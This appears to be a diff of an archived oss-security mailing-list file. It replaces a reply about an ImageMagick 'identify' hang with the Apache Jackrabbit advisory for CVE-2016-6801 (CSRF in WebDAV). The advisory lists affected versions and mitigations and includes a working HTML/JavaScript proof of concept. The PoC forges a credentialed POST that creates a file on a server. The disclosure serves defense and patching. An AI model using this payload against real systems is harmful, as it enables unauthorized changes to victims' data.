@@ -1,33 +1,67 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/27/7
-Message-ID: <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
-Date: Tue, 27 Sep 2016 09:56:58 -0500 (CDT)
-From: Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>
-To: oss-security@...ts.openwall.com
-Subject: Re: ImageMagick identify "d:" hangs
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/14/6
+Message-ID: <3bb23017-9519-7dfc-0c6c-7364fb5bae42@apache.org>
+Date: Wed, 14 Sep 2016 14:34:22 +0200
+From: Julian Reschke <reschke@...che.org>
+To: Lukas Reschke <lukas@...tuscode.ch>, Jackrabbit Users <users@...krabbit.apache.org>, "dev@...krabbit.apache.org" <dev@...krabbit.apache.org>, "security@...che.org" <security@...che.org>, oss-security@...ts.openwall.com, bugtraq@...urityfocus.com
+Subject: CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type
 Content-Type: text/plain; charset=utf-8
 
-On Tue, 27 Sep 2016, Jakub Wilk wrote:
+CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type
 
-> * Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>, 2016-09-27, 08:48:
->> From my own investigations, I used
->>
->>  identify -debug all "d:"
->> 
->> and see that a temporary file is reported to be created and then the 
->> program hangs which no apparent CPU usage.
->
-> strace tells me that it waits for input on stdin.
-> This is a simpler way to make it "hang":
->
->  identify -
+Severity: Important
 
-This is what I expected was happening.  The main thing to investigate 
-is if the "ImageTragick" patches distributions are using do protect 
-against this possible issue as well.
+Vendor:
+The Apache Software Foundation
 
-Bob
--- 
-Bob Friesenhahn
-bfriesen@...ple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
-GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+Versions Affected:
+Apache Jackrabbit 2.4.5
+Apache Jackrabbit 2.6.5
+Apache Jackrabbit 2.8.2
+Apache Jackrabbit 2.10.3
+Apache Jackrabbit 2.12.3
+Apache Jackrabbit 2.13.2
+
+Description:
+The CSRF content-type check for POST requests does not handle missing 
+Content-Type header fields, nor variations in field values with respect 
+to upper/lower case or optional parameters. This can be exploited to 
+create a resource via CSRF.
+
+Mitigation:
+2.4.x users upgrade to 2.4.5 and apply the patch in 
+http://svn.apache.org/r1758791 and/or upgrade to 2.4.6 once released
+2.6.x users upgrade to 2.6.5 and apply the patch in 
+http://svn.apache.org/r1758771 and/or upgrade to 2.6.6 once released
+2.8.x users upgrade to 2.8.2 and apply the patch in 
+http://svn.apache.org/r1758764 and/or upgrade to 2.8.3 once released
+2.10.x users should upgrade to 2.10.4
+2.12.x users should upgrade to 2.12.4
+2.13.x users should upgrade to 2.13.3
+
+Example:
+A resource can be created like so:
+<html>
+   <body>
+     <script>
+       function submitRequest()
+       {
+         var xhr = new XMLHttpRequest();
+         xhr.open("POST", "http://localhost:42427/test/csrf.txt", true);
+         xhr.withCredentials = true;
+         var body = "This file has been uploaded via CSRF.=\r\n";
+         var aBody = new Uint8Array(body.length);
+         for (var i = 0; i < aBody.length; i++)
+           aBody[i] = body.charCodeAt(i);
+         xhr.send(new Blob([aBody]));
+       }
+     </script>
+     <form action="#">
+       <input type="button" value="Submit request" 
+onclick="submitRequest();" />
+     </form>
+   </body>
+</html>
+
+Credit:
+This issue was discovered by Lukas Reschke.
